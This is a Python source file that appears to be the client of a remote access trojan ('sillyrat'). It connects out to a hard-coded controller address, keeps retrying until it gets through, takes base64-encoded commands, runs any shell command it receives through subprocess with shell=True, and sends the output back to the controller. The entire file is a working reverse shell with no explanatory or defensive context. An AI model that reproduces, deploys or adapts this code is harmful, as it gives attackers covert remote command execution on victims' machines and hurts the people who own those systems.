import sys
import os
import socket
import time
import base64
import os
import tabulate
import signal
import shlex
import subprocess
import threading

CONSTIP = "127.0.0.1"
CONSTPT = 4000

class CLIENT:

    SOCK = None
    KEY  = ")J@NcRfU"

    def __init__(self, _ip, _pt):
        self.ipaddress = _ip
        self.port      = _pt

    def send_data(self, tosend):
        self.SOCK.send(base64.encodebytes(tosend.encode('utf-8')) + self.KEY.encode('utf-8'))

    def execute(self, command):
        data = command.decode('utf-8').split(":")

        if data[0] == "shell":

            print("Executing Shell: " + data[1])
            toexecute = data[1].rstrip(" ").lstrip(" ")
            toexecute = " ".join(toexecute.split())
            if toexecute.split(" ")[0] == "cd":
                try:
                    os.chdir(toexecute.split(" ")[1])
                    self.send_data("")
                except:
                    self.send_data("Error while changing diretory!")
            else:
                try:
                    comm = subprocess.Popen(data[1], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
                    output, errors = comm.communicate()
                    self.send_data(output + errors)
                except FileNotFoundError:
                    self.send_data("No Such File or Directory")

        elif data[0] == "sillyrat":

            print("Executing Sillyrat: " + data[1])

    def acceptor(self):
        data = ""
        chunk = b""

        while True:
            chunk = self.SOCK.recv(4096)
            if not chunk:
                break
            data += chunk.decode('utf-8')

            if self.KEY.encode('utf-8') in chunk:
                data = data.rstrip(self.KEY)
                t = threading.Thread(target=self.execute, args=(base64.decodebytes(data.encode('utf-8')),))
                t.daemon = True
                t.start()
                data = ""

    def engage(self):
        self.SOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        while True:
            try:
                print("Connecting To: %s:%d" % (self.ipaddress, self.port))
                self.SOCK.connect((self.ipaddress, self.port))
            except:
                print("Failed to Connect. Trying Again!")
                time.sleep(5)
                continue

            self.acceptor()

def main():
    client = CLIENT(CONSTIP, CONSTPT)
    client.engage()

if __name__ == "__main__":
    main()